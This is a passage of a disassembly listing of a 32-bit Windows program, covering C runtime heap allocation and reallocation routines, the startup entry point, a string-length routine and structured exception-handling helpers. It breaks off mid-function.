loc_40FD94:                             ; CODE XREF: sub_40FD55+34↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_40FDAB
; ---------------------------------------------------------------------------

loc_40FDA0:                             ; CODE XREF: sub_40FD55+5E↓j
                cmp     [ebp+var_1C], 0
                jnz     short loc_40FDDD
                push    [ebp+lpMem]
                jmp     short loc_40FDB5
; ---------------------------------------------------------------------------

loc_40FDAB:                             ; CODE XREF: sub_40FD55+46↑j
                                        ; DATA XREF: .rdata:stru_422D08↓o
                push    4
                call    sub_416839
                pop     ecx
                retn
; ---------------------------------------------------------------------------

loc_40FDB4:                             ; CODE XREF: sub_40FD55+1A↑j
                push    esi             ; lpMem

loc_40FDB5:                             ; CODE XREF: sub_40FD55+54↑j
                push    0               ; dwFlags
                push    hHeap           ; hHeap
                call    ds:HeapFree
                test    eax, eax
                jnz     short loc_40FDDD
                call    sub_41090E
                mov     esi, eax
                call    ds:GetLastError
                push    eax
                call    sub_4108CC
                mov     [esi], eax
                pop     ecx

loc_40FDDD:                             ; CODE XREF: sub_40FD55+11↑j
                                        ; sub_40FD55+4F↑j ...
                call    __SEH_epilog4
                retn
sub_40FD55      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40FDE3      proc near               ; CODE XREF: sub_40FE32+59↓p

var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8

                push    0Ch
                push    offset stru_422D28
                call    __SEH_prolog4
                and     [ebp+var_1C], 0
                mov     esi, [ebp+arg_0]
                cmp     esi, dword_42C9D8
                ja      short loc_40FE20
                push    4
                call    sub_416913
                pop     ecx
                and     [ebp+ms_exc.registration.TryLevel], 0
                push    esi
                call    sub_417125
                pop     ecx
                mov     [ebp+var_1C], eax
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_40FE29
; ---------------------------------------------------------------------------

loc_40FE20:                             ; CODE XREF: sub_40FDE3+19↑j
                                        ; sub_40FDE3+4E↓j
                mov     eax, [ebp+var_1C]
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_40FE29:                             ; CODE XREF: sub_40FDE3+38↑j
                                        ; DATA XREF: .rdata:stru_422D28↓o
                push    4
                call    sub_416839
                pop     ecx
                retn
sub_40FDE3      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40FE32      proc near               ; CODE XREF: sub_40D640+1A↑p
                                        ; sub_40D640+5D↑p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_0]
                cmp     esi, 0FFFFFFE0h
                ja      loc_40FEE5
                push    ebx
                push    edi
                mov     edi, ds:HeapAlloc

loc_40FE4C:                             ; CODE XREF: sub_40FE32+9A↓j
                cmp     hHeap, 0
                jnz     short loc_40FE6D
                call    sub_4175B5
                push    1Eh
                call    sub_41740A
                push    0FFh            ; uExitCode
                call    sub_412DB9
; ---------------------------------------------------------------------------
                db  59h ; Y
                db  59h ; Y
; ---------------------------------------------------------------------------

loc_40FE6D:                             ; CODE XREF: sub_40FE32+21↑j
                mov     eax, dword_42C9E8
                cmp     eax, 1
                jnz     short loc_40FE85
                test    esi, esi
                jz      short loc_40FE7F
                mov     eax, esi
                jmp     short loc_40FE82
; ---------------------------------------------------------------------------

loc_40FE7F:                             ; CODE XREF: sub_40FE32+47↑j
                xor     eax, eax
                inc     eax

loc_40FE82:                             ; CODE XREF: sub_40FE32+4B↑j
                push    eax
                jmp     short loc_40FEA1
; ---------------------------------------------------------------------------

loc_40FE85:                             ; CODE XREF: sub_40FE32+43↑j
                cmp     eax, 3
                jnz     short loc_40FE95
                push    esi
                call    sub_40FDE3
                pop     ecx
                test    eax, eax
                jnz     short loc_40FEAB

loc_40FE95:                             ; CODE XREF: sub_40FE32+56↑j
                test    esi, esi
                jnz     short loc_40FE9A
                inc     esi

loc_40FE9A:                             ; CODE XREF: sub_40FE32+65↑j
                add     esi, 0Fh
                and     esi, 0FFFFFFF0h
                push    esi             ; dwBytes

loc_40FEA1:                             ; CODE XREF: sub_40FE32+51↑j
                push    0               ; dwFlags
                push    hHeap           ; hHeap
                call    edi ; HeapAlloc

loc_40FEAB:                             ; CODE XREF: sub_40FE32+61↑j
                mov     ebx, eax
                test    ebx, ebx
                jnz     short loc_40FEDF
                push    0Ch
                pop     esi
                cmp     dword_42B31C, eax
                jz      short loc_40FED1
                push    [ebp+arg_0]
                call    sub_416137
                pop     ecx
                test    eax, eax
                jz      short loc_40FED8
                mov     esi, [ebp+arg_0]
                jmp     loc_40FE4C
; ---------------------------------------------------------------------------

loc_40FED1:                             ; CODE XREF: sub_40FE32+88↑j
                call    sub_41090E
                mov     [eax], esi

loc_40FED8:                             ; CODE XREF: sub_40FE32+95↑j
                call    sub_41090E
                mov     [eax], esi

loc_40FEDF:                             ; CODE XREF: sub_40FE32+7D↑j
                pop     edi
                mov     eax, ebx
                pop     ebx
                jmp     short loc_40FEF9
; ---------------------------------------------------------------------------

loc_40FEE5:                             ; CODE XREF: sub_40FE32+C↑j
                push    esi
                call    sub_416137
                pop     ecx
                call    sub_41090E
                mov     dword ptr [eax], 0Ch
                xor     eax, eax

loc_40FEF9:                             ; CODE XREF: sub_40FE32+B1↑j
                pop     esi
                pop     ebp
                retn
sub_40FE32      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_40FEFC(LPVOID lpMem, SIZE_T dwBytes)
sub_40FEFC      proc near               ; CODE XREF: sub_40D870+3F↑p
                                        ; sub_412C44+F↓p

var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
lpMem           = dword ptr  8
dwBytes         = dword ptr  0Ch

                push    10h
                push    offset stru_422D48
                call    __SEH_prolog4
                mov     ebx, [ebp+lpMem]
                test    ebx, ebx
                jnz     short loc_40FF1D
                push    [ebp+dwBytes]
                call    sub_40FE32
                pop     ecx
                jmp     loc_4100E9
; ---------------------------------------------------------------------------

loc_40FF1D:                             ; CODE XREF: sub_40FEFC+11↑j
                mov     esi, [ebp+dwBytes]
                test    esi, esi
                jnz     short loc_40FF30
                push    ebx             ; lpMem
                call    sub_40FD55
                pop     ecx
                jmp     loc_4100E7
; ---------------------------------------------------------------------------

loc_40FF30:                             ; CODE XREF: sub_40FEFC+26↑j
                cmp     dword_42C9E8, 3
                jnz     loc_4100D0

loc_40FF3D:                             ; CODE XREF: sub_40FEFC+169↓j
                xor     edi, edi
                mov     [ebp+var_1C], edi
                cmp     esi, 0FFFFFFE0h
                ja      loc_4100D5
                push    4
                call    sub_416913
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], edi
                push    ebx
                call    sub_416946
                pop     ecx
                mov     [ebp+var_20], eax
                cmp     eax, edi
                jz      loc_410006
                cmp     esi, dword_42C9D8
                ja      short loc_40FFB9
                push    esi
                push    ebx
                push    eax
                call    sub_416E44
                add     esp, 0Ch
                test    eax, eax
                jz      short loc_40FF84
                mov     [ebp+var_1C], ebx
                jmp     short loc_40FFB9
; ---------------------------------------------------------------------------

loc_40FF84:                             ; CODE XREF: sub_40FEFC+81↑j
                push    esi
                call    sub_417125
                pop     ecx
                mov     [ebp+var_1C], eax
                cmp     eax, edi
                jz      short loc_40FFB9
                mov     eax, [ebx-4]
                dec     eax
                cmp     eax, esi
                jb      short loc_40FF9C
                mov     eax, esi

loc_40FF9C:                             ; CODE XREF: sub_40FEFC+9C↑j
                push    eax
                push    ebx
                push    [ebp+var_1C]
                call    sub_414550
                push    ebx
                call    sub_416946
                mov     [ebp+var_20], eax
                push    ebx
                push    eax
                call    sub_416976
                add     esp, 18h

loc_40FFB9:                             ; CODE XREF: sub_40FEFC+72↑j
                                        ; sub_40FEFC+86↑j ...
                cmp     [ebp+var_1C], edi
                jnz     short loc_410006
                cmp     esi, edi
                jnz     short loc_40FFC8
                xor     esi, esi
                inc     esi
                mov     [ebp+dwBytes], esi

loc_40FFC8:                             ; CODE XREF: sub_40FEFC+C4↑j
                add     esi, 0Fh
                and     esi, 0FFFFFFF0h
                mov     [ebp+dwBytes], esi
                push    esi             ; dwBytes
                push    edi             ; dwFlags
                push    hHeap           ; hHeap
                call    ds:HeapAlloc
                mov     [ebp+var_1C], eax
                cmp     eax, edi
                jz      short loc_410006
                mov     eax, [ebx-4]
                dec     eax
                cmp     eax, esi
                jb      short loc_40FFF0
                mov     eax, esi

loc_40FFF0:                             ; CODE XREF: sub_40FEFC+F0↑j
                push    eax
                push    ebx
                push    [ebp+var_1C]
                call    sub_414550
                push    ebx
                push    [ebp+var_20]
                call    sub_416976
                add     esp, 14h

loc_410006:                             ; CODE XREF: sub_40FEFC+66↑j
                                        ; sub_40FEFC+C0↑j ...
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_410040
; ---------------------------------------------------------------------------

loc_410012:                             ; CODE XREF: sub_40FEFC+14C↓j
                cmp     [ebp+var_20], 0
                jnz     short loc_410049
                test    esi, esi
                jnz     short loc_41001D
                inc     esi

loc_41001D:                             ; CODE XREF: sub_40FEFC+11E↑j
                add     esi, 0Fh
                and     esi, 0FFFFFFF0h
                mov     [ebp+dwBytes], esi
                push    esi             ; dwBytes
                push    ebx             ; lpMem
                push    0               ; dwFlags
                push    hHeap           ; hHeap
                call    ds:HeapReAlloc
                mov     edi, eax
                jmp     short loc_41004C
; ---------------------------------------------------------------------------

loc_41003A:                             ; DATA XREF: .rdata:stru_422D48↓o
                mov     esi, [ebp+dwBytes]
                mov     ebx, [ebp+lpMem]

loc_410040:                             ; CODE XREF: sub_40FEFC+111↑j
                push    4
                call    sub_416839
                pop     ecx
                retn
; ---------------------------------------------------------------------------

loc_410049:                             ; CODE XREF: sub_40FEFC+11A↑j
                mov     edi, [ebp+var_1C]

loc_41004C:                             ; CODE XREF: sub_40FEFC+13C↑j
                test    edi, edi
                jnz     loc_410113
                cmp     dword_42B31C, edi
                jz      short loc_410088
                push    esi
                call    sub_416137
                pop     ecx
                test    eax, eax
                jnz     loc_40FF3D
                call    sub_41090E
                cmp     [ebp+var_20], edi
                jnz     short loc_4100E1

loc_410075:                             ; CODE XREF: sub_40FEFC+1F8↓j
                mov     esi, eax
                call    ds:GetLastError
                push    eax
                call    sub_4108CC
                pop     ecx
                mov     [esi], eax
                jmp     short loc_4100E7
; ---------------------------------------------------------------------------

loc_410088:                             ; CODE XREF: sub_40FEFC+15E↑j
                test    edi, edi
                jnz     loc_410113
                call    sub_41090E
                cmp     [ebp+var_20], edi
                jz      short loc_410102
                mov     dword ptr [eax], 0Ch
                jmp     short loc_410113
; ---------------------------------------------------------------------------

loc_4100A2:                             ; CODE XREF: sub_40FEFC+1D7↓j
                test    esi, esi
                jnz     short loc_4100A7
                inc     esi

loc_4100A7:                             ; CODE XREF: sub_40FEFC+1A8↑j
                push    esi             ; dwBytes
                push    ebx             ; lpMem
                push    0               ; dwFlags
                push    hHeap           ; hHeap
                call    ds:HeapReAlloc
                mov     edi, eax
                test    edi, edi
                jnz     short loc_410113
                cmp     dword_42B31C, eax
                jz      short loc_4100F9
                push    esi
                call    sub_416137
                pop     ecx
                test    eax, eax
                jz      short loc_4100EF

loc_4100D0:                             ; CODE XREF: sub_40FEFC+3B↑j
                cmp     esi, 0FFFFFFE0h
                jbe     short loc_4100A2

loc_4100D5:                             ; CODE XREF: sub_40FEFC+49↑j
                push    esi
                call    sub_416137
                pop     ecx
                call    sub_41090E

loc_4100E1:                             ; CODE XREF: sub_40FEFC+177↑j
                mov     dword ptr [eax], 0Ch

loc_4100E7:                             ; CODE XREF: sub_40FEFC+2F↑j
                                        ; sub_40FEFC+18A↑j
                xor     eax, eax

loc_4100E9:                             ; CODE XREF: sub_40FEFC+1C↑j
                                        ; sub_40FEFC+219↓j
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_4100EF:                             ; CODE XREF: sub_40FEFC+1D2↑j
                call    sub_41090E
                jmp     loc_410075
; ---------------------------------------------------------------------------

loc_4100F9:                             ; CODE XREF: sub_40FEFC+1C7↑j
                test    edi, edi
                jnz     short loc_410113
                call    sub_41090E

loc_410102:                             ; CODE XREF: sub_40FEFC+19C↑j
                mov     esi, eax
                call    ds:GetLastError
                push    eax
                call    sub_4108CC
                mov     [esi], eax
                pop     ecx

loc_410113:                             ; CODE XREF: sub_40FEFC+152↑j
                                        ; sub_40FEFC+18E↑j ...
                mov     eax, edi
                jmp     short loc_4100E9
sub_40FEFC      endp


; =============== S U B R O U T I N E =======================================

; Attributes: noreturn bp-based frame

sub_410117      proc near               ; CODE XREF: start-EE↓p
                                        ; start-DD↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                cmp     dword_42AADC, 2
                jz      short loc_41012A
                call    sub_4175B5

loc_41012A:                             ; CODE XREF: sub_410117+C↑j
                push    [ebp+arg_0]
                call    sub_41740A
                push    0FFh            ; uExitCode
                call    sub_412DB9
sub_410117      endp

; ---------------------------------------------------------------------------
                db  59h ; Y
                db  59h ; Y
                db  5Dh ; ]
                db 0C3h ; Ã
; ---------------------------------------------------------------------------
; START OF FUNCTION CHUNK FOR start

loc_410140:                             ; CODE XREF: start+5↓j
                push    14h
                push    offset unk_422D68
                call    __SEH_prolog4
                mov     eax, 5A4Dh
                cmp     ds:400000h, ax
                jnz     short loc_410192
                mov     eax, ds:40003Ch
                cmp     dword ptr [eax+400000h], 4550h
                jnz     short loc_410192
                mov     ecx, 10Bh
                cmp     [eax+400018h], cx
                jnz     short loc_410192
                cmp     dword ptr [eax+400074h], 0Eh
                jbe     short loc_410192
                xor     ecx, ecx
                cmp     [eax+4000E8h], ecx
                setnz   cl
                mov     [ebp-1Ch], ecx
                jmp     short loc_410196
; ---------------------------------------------------------------------------

loc_410192:                             ; CODE XREF: start-13A↑j
                                        ; start-129↑j ...
                and     dword ptr [ebp-1Ch], 0

loc_410196:                             ; CODE XREF: start-102↑j
                push    1
                call    sub_416767
                pop     ecx
                test    eax, eax
                jnz     short loc_4101AA
                push    1Ch
                call    sub_410117
; END OF FUNCTION CHUNK FOR start
; ---------------------------------------------------------------------------
                pop     ecx
; START OF FUNCTION CHUNK FOR start

loc_4101AA:                             ; CODE XREF: start-F2↑j
                call    sub_4125BC
                test    eax, eax
                jnz     short loc_4101BB
                push    10h
                call    sub_410117
; END OF FUNCTION CHUNK FOR start
; ---------------------------------------------------------------------------
                pop     ecx
; START OF FUNCTION CHUNK FOR start

loc_4101BB:                             ; CODE XREF: start-E1↑j
                call    sub_417AA8
                and     dword ptr [ebp-4], 0
                call    sub_415257
                test    eax, eax
                jge     short loc_4101D5
                push    1Bh
                call    sub_412D65
                pop     ecx

loc_4101D5:                             ; CODE XREF: start-C7↑j
                call    ds:GetCommandLineA
                mov     dword_42DB3C, eax
                call    sub_417971
                mov     dword_42AAD4, eax
                call    sub_4178B6
                test    eax, eax
                jge     short loc_4101FB
                push    8
                call    sub_412D65
                pop     ecx

loc_4101FB:                             ; CODE XREF: start-A1↑j
                call    sub_41763E
                test    eax, eax
                jge     short loc_41020C
                push    9
                call    sub_412D65
                pop     ecx

loc_41020C:                             ; CODE XREF: start-90↑j
                push    1
                call    sub_412E24
                pop     ecx
                test    eax, eax
                jz      short loc_41021F
                push    eax
                call    sub_412D65
                pop     ecx

loc_41021F:                             ; CODE XREF: start-7C↑j
                mov     eax, dword_42AE68
                mov     dword_42AE6C, eax
                push    eax
                push    dword_42AE60
                push    dword_42AE5C
                call    sub_401AE0
                add     esp, 0Ch
                mov     [ebp-20h], eax
                cmp     dword ptr [ebp-1Ch], 0
                jnz     short loc_41024D
                push    eax             ; uExitCode
                call    sub_412FD5

loc_41024D:                             ; CODE XREF: start-4D↑j
                call    sub_413001
                jmp     short loc_410282
; END OF FUNCTION CHUNK FOR start

; =============== S U B R O U T I N E =======================================


sub_410254      proc near               ; DATA XREF: .rdata:00422D7C↓o
                mov     eax, [ebp-14h]
                mov     ecx, [eax]
                mov     ecx, [ecx]
                mov     [ebp-24h], ecx
                push    eax
                push    ecx
                call    sub_4133AD
                pop     ecx
                pop     ecx
                retn
sub_410254      endp


; =============== S U B R O U T I N E =======================================


sub_410268      proc near               ; DATA XREF: .rdata:00422D80↓o
                mov     esp, [ebp-18h]
                mov     eax, [ebp-24h]
                mov     [ebp-20h], eax
                cmp     dword ptr [ebp-1Ch], 0
                jnz     short loc_41027D
                push    eax             ; uExitCode
                call    sub_412FEB

loc_41027D:                             ; CODE XREF: sub_410268+D↑j
                call    sub_413010
sub_410268      endp ; sp-analysis failed

; START OF FUNCTION CHUNK FOR start

loc_410282:                             ; CODE XREF: start-40↑j
                mov     dword ptr [ebp-4], 0FFFFFFFEh
                mov     eax, [ebp-20h]
                call    __SEH_epilog4
                retn
; END OF FUNCTION CHUNK FOR start

; =============== S U B R O U T I N E =======================================


                public start
start           proc near

; FUNCTION CHUNK AT 00410140 SIZE 00000069 BYTES
; FUNCTION CHUNK AT 004101AA SIZE 00000010 BYTES
; FUNCTION CHUNK AT 004101BB SIZE 00000099 BYTES
; FUNCTION CHUNK AT 00410282 SIZE 00000010 BYTES

                call    sub_417AF4
                jmp     loc_410140
start           endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4102A0      proc near               ; CODE XREF: sub_40E649+1A↑p
                                        ; sub_40E6B9+25↑p ...

arg_0           = dword ptr  4

                mov     ecx, [esp+arg_0]
                test    ecx, 3
                jz      short loc_4102D0

loc_4102AC:                             ; CODE XREF: sub_4102A0+1B↓j
                mov     al, [ecx]
                add     ecx, 1
                test    al, al
                jz      short loc_410303
                test    ecx, 3
                jnz     short loc_4102AC
                add     eax, 0
                lea     esp, [esp+0]
                lea     esp, [esp+0]

loc_4102D0:                             ; CODE XREF: sub_4102A0+A↑j
                                        ; sub_4102A0+46↓j ...
                mov     eax, [ecx]
                mov     edx, 7EFEFEFFh
                add     edx, eax
                xor     eax, 0FFFFFFFFh
                xor     eax, edx
                add     ecx, 4
                test    eax, 81010100h
                jz      short loc_4102D0
                mov     eax, [ecx-4]
                test    al, al
                jz      short loc_410321
                test    ah, ah
                jz      short loc_410317
                test    eax, 0FF0000h
                jz      short loc_41030D
                test    eax, 0FF000000h
                jz      short loc_410303
                jmp     short loc_4102D0
; ---------------------------------------------------------------------------

loc_410303:                             ; CODE XREF: sub_4102A0+13↑j
                                        ; sub_4102A0+5F↑j
                lea     eax, [ecx-1]
                mov     ecx, [esp+arg_0]
                sub     eax, ecx
                retn
; ---------------------------------------------------------------------------

loc_41030D:                             ; CODE XREF: sub_4102A0+58↑j
                lea     eax, [ecx-2]
                mov     ecx, [esp+arg_0]
                sub     eax, ecx
                retn
; ---------------------------------------------------------------------------

loc_410317:                             ; CODE XREF: sub_4102A0+51↑j
                lea     eax, [ecx-3]
                mov     ecx, [esp+arg_0]
                sub     eax, ecx
                retn
; ---------------------------------------------------------------------------

loc_410321:                             ; CODE XREF: sub_4102A0+4D↑j
                lea     eax, [ecx-4]
                mov     ecx, [esp+arg_0]
                sub     eax, ecx
                retn
sub_4102A0      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41032B      proc near               ; CODE XREF: sub_408740+103↑p
                                        ; sub_4092F0+7C↑p ...

dwExceptionCode = dword ptr -20h
dwExceptionFlags= dword ptr -1Ch
nNumberOfArguments= dword ptr -10h
Arguments       = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 20h
                mov     eax, [ebp+arg_0]
                push    esi
                push    edi
                push    8
                pop     ecx
                mov     esi, offset unk_4202DC
                lea     edi, [ebp+dwExceptionCode]
                rep movsd
                mov     [ebp+var_8], eax
                mov     eax, [ebp+arg_4]
                pop     edi
                mov     [ebp+var_4], eax
                pop     esi
                test    eax, eax
                jz      short loc_410360
                test    byte ptr [eax], 8
                jz      short loc_410360
                mov     [ebp+Arguments], 1994000h

loc_410360:                             ; CODE XREF: sub_41032B+27↑j
                                        ; sub_41032B+2C↑j
                lea     eax, [ebp+Arguments]
                push    eax             ; lpArguments
                push    [ebp+nNumberOfArguments] ; nNumberOfArguments
                push    [ebp+dwExceptionFlags] ; dwExceptionFlags
                push    [ebp+dwExceptionCode] ; dwExceptionCode
                call    ds:RaiseException
                leave
                retn    8
sub_41032B      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_410377      proc near               ; CODE XREF: sub_418297+67↓p

var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ebx
                mov     eax, [ebp+arg_4]
                add     eax, 0Ch
                mov     [ebp+var_4], eax
                mov     ebx, large fs:0
                mov     eax, [ebx]
                mov     large fs:0, eax
                mov     eax, [ebp+arg_0]
                mov     ebx, [ebp+arg_4]
                mov     ebp, [ebp+var_4]
                mov     esp, [ebx-4]
                jmp     eax
sub_410377      endp

; ---------------------------------------------------------------------------
                pop     ebx
                leave
                retn    8

; =============== S U B R O U T I N E =======================================


sub_4103A9      proc near               ; CODE XREF: sub_417DA8+31↓p
                                        ; sub_418205+59↓p ...

arg_4           = dword ptr  8

                pop     eax
                pop     ecx
                xchg    eax, [esp-8+arg_4]
                jmp     eax
sub_4103A9      endp ; sp-analysis failed


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __stdcall sub_4103B0(PVOID TargetFrame, PEXCEPTION_RECORD ExceptionRecord)
sub_4103B0      proc near               ; CODE XREF: sub_410544+6B↓p
                                        ; sub_418297:loc_4182C1↓p ...

TargetIp        = dword ptr -8
var_4           = dword ptr -4
TargetFrame     = dword ptr  8
ExceptionRecord = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ecx
                push    ebx
                push    esi
                push    edi
                mov     esi, large fs:0
                mov     [ebp+var_4], esi
                mov     [ebp+TargetIp], offset loc_4103DB
                push    0               ; ReturnValue
                push    [ebp+ExceptionRecord] ; ExceptionRecord
                push    [ebp+TargetIp]  ; TargetIp
                push    [ebp+TargetFrame] ; TargetFrame
                call    RtlUnwind

loc_4103DB:                             ; DATA XREF: sub_4103B0+14↑o
                mov     eax, [ebp+ExceptionRecord]
                mov     eax, [eax+4]
                and     eax, 0FFFFFFFDh
                mov     ecx, [ebp+ExceptionRecord]
                mov     [ecx+4], eax
                mov     edi, large fs:0
                mov     ebx, [ebp+var_4]
                mov     [ebx], edi
                mov     large fs:0, ebx
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn    8
sub_4103B0      endp

; [00000036 BYTES: COLLAPSED FUNCTION ___CxxFrameHandler3. PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41043A      proc near               ; DATA XREF: sub_4106FD+26↓o
                                        ; .rdata:___safe_se_handler_table↓o

ExceptionRecord = dword ptr  8
TargetFrame     = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                cld
                mov     esi, [ebp+TargetFrame]
                mov     ecx, [esi+8]
                xor     ecx, esi
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                push    0               ; char
                push    esi             ; TargetFrame
                push    dword ptr [esi+14h] ; int
                push    dword ptr [esi+0Ch] ; int
                push    0               ; int
                push    [ebp+arg_8]     ; int
                push    dword ptr [esi+10h] ; int
                push    [ebp+ExceptionRecord] ; ExceptionRecord
                call    sub_41875D
                add     esp, 20h
                pop     esi
                pop     ebp
                retn
sub_41043A      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41046D      proc near               ; CODE XREF: sub_410544+83↓p
                                        ; sub_418305+55↓p

var_38          = dword ptr -38h
var_34          = dword ptr -34h
var_30          = dword ptr -30h
var_2C          = dword ptr -2Ch
var_28          = dword ptr -28h
var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_10          = dword ptr  18h
arg_14          = dword ptr  1Ch
arg_18          = dword ptr  20h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 38h
                push    ebx
                cmp     [ebp+arg_0], 123h
                jnz     short loc_410491
                mov     eax, offset loc_410518
                mov     ecx, [ebp+arg_4]
                mov     [ecx], eax
                xor     eax, eax
                inc     eax
                jmp     loc_410541
; ---------------------------------------------------------------------------

loc_410491:                             ; CODE XREF: sub_41046D+10↑j
                and     [ebp+var_28], 0
                mov     [ebp+var_24], offset sub_410544
                mov     eax, ___security_cookie
                lea     ecx, [ebp+var_28]
                xor     eax, ecx
                mov     [ebp+var_20], eax
                mov     eax, [ebp+arg_10]
                mov     [ebp+var_1C], eax
                mov     eax, [ebp+arg_4]
                mov     [ebp+var_18], eax
                mov     eax, [ebp+arg_14]
                mov     [ebp+var_14], eax
                mov     eax, [ebp+arg_18]
                mov     [ebp+var_10], eax
                and     [ebp+var_C], 0
                and     [ebp+var_8], 0
                and     [ebp+var_4], 0
                mov     [ebp+var_C], esp
                mov     [ebp+var_8], ebp
                mov     eax, large fs:0
                mov     [ebp+var_28], eax
                lea     eax, [ebp+var_28]
                mov     large fs:0, eax
                mov     [ebp+var_38], 1
                mov     eax, [ebp+arg_0]
                mov     [ebp+var_34], eax
                mov     eax, [ebp+arg_8]
                mov     [ebp+var_30], eax
                call    sub_412405
                mov     eax, [eax+80h]
                mov     [ebp+var_2C], eax
                lea     eax, [ebp+var_34]
                push    eax
                mov     eax, [ebp+arg_0]
                push    dword ptr [eax]
                call    [ebp+var_2C]
                pop     ecx
                pop     ecx
                and     [ebp+var_38], 0

loc_410518:                             ; DATA XREF: sub_41046D+12↑o
                cmp     [ebp+var_4], 0
                jz      short loc_410535
                mov     ebx, large fs:0
                mov     eax, [ebx]
                mov     ebx, [ebp+var_28]
                mov     [ebx], eax
                mov     large fs:0, ebx
                jmp     short loc_41053E
; ---------------------------------------------------------------------------

loc_410535:                             ; CODE XREF: sub_41046D+AF↑j
                mov     eax, [ebp+var_28]
                mov     large fs:0, eax

loc_41053E:                             ; CODE XREF: sub_41046D+C6↑j
                mov     eax, [ebp+var_38]

loc_410541:                             ; CODE XREF: sub_41046D+1F↑j
                pop     ebx
                leave
                retn
sub_41046D      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_410544(PEXCEPTION_RECORD ExceptionRecord, PVOID TargetFrame, int)
sub_410544      proc near               ; DATA XREF: sub_41046D+28↑o
                                        ; .rdata:00422AF4↓o

var_4           = dword ptr -4
ExceptionRecord = dword ptr  8
TargetFrame     = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ebx
                cld
                mov     eax, [ebp+TargetFrame]
                mov     ecx, [eax+8]
                xor     ecx, [ebp+TargetFrame]
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, [ebp+ExceptionRecord]
                mov     eax, [eax+4]
                and     eax, 66h
                jz      short loc_410576
                mov     eax, [ebp+TargetFrame]
                mov     dword ptr [eax+24h], 1
                xor     eax, eax
                inc     eax
                jmp     short loc_4105E0
; ---------------------------------------------------------------------------
                jmp     short loc_4105E0
; ---------------------------------------------------------------------------

loc_410576:                             ; CODE XREF: sub_410544+1F↑j
                push    1               ; char
                mov     eax, [ebp+TargetFrame]
                push    dword ptr [eax+18h] ; TargetFrame
                mov     eax, [ebp+TargetFrame]
                push    dword ptr [eax+14h] ; int
                mov     eax, [ebp+TargetFrame]
                push    dword ptr [eax+0Ch] ; int
                push    0               ; int
                push    [ebp+arg_8]     ; int
                mov     eax, [ebp+TargetFrame]
                push    dword ptr [eax+10h] ; int
                push    [ebp+ExceptionRecord] ; ExceptionRecord
                call    sub_41875D
                add     esp, 20h
                mov     eax, [ebp+TargetFrame]
                cmp     dword ptr [eax+24h], 0
                jnz     short loc_4105B4
                push    [ebp+ExceptionRecord] ; ExceptionRecord
                push    [ebp+TargetFrame] ; TargetFrame
                call    sub_4103B0

loc_4105B4:                             ; CODE XREF: sub_410544+63↑j
                push    0
                push    0
                push    0
                push    0
                push    0
                lea     eax, [ebp+var_4]
                push    eax
                push    123h
                call    sub_41046D
                add     esp, 1Ch
                mov     eax, [ebp+var_4]
                mov     ebx, [ebp+TargetFrame]
                mov     esp, [ebx+1Ch]
                mov     ebp, [ebx+20h]
                jmp     eax
; ---------------------------------------------------------------------------
                xor     eax, eax
                inc     eax

loc_4105E0:                             ; CODE XREF: sub_410544+2E↑j
                                        ; sub_410544+30↑j
                pop     ebx
                leave
                retn
sub_410544      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4105E3      proc near               ; CODE XREF: sub_418305+83↓p
                                        ; sub_4183F9+1B7↓p

var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ebx
                push    esi
                push    edi
                mov     edi, [ebp+arg_0]
                mov     eax, [edi+10h]
                mov     esi, [edi+0Ch]
                mov     [ebp+var_4], eax
                mov     ebx, esi
                jmp     short loc_410629
